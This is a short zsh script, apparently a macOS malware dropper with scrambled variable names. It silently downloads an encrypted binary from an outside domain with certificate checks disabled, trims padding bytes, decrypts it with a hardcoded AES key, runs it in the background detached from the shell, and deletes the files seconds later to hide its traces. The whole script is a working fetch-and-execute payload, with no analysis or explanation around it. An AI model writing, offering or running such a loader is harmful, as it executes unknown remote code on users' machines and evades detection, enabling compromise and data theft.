#!/bin/zsh
hqtbu=$(mktemp /tmp/9wz6wb.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6340fbceef9f802e.bin" -o "$hqtbuz" || exit 1
rcq2d4=$(stat -f %z "$hqtbuz"); f5xweuv=$(( rcq2d4 - 3620 - 2185 ))
tail -c +$(( 3620 + 1 )) "$hqtbuz" | head -c $f5xweuv | openssl enc -d -aes-256-cbc -k 69eb1e6561dfe0356d70de24 -out "$hqtbu" 2>/dev/null
[ -s "$hqtbu" ] && chmod 700 "$hqtbu" && ( "$hqtbu" & ) && disown
( sleep 3; rm -f "$hqtbu" "$hqtbuz" ) &>/dev/null &
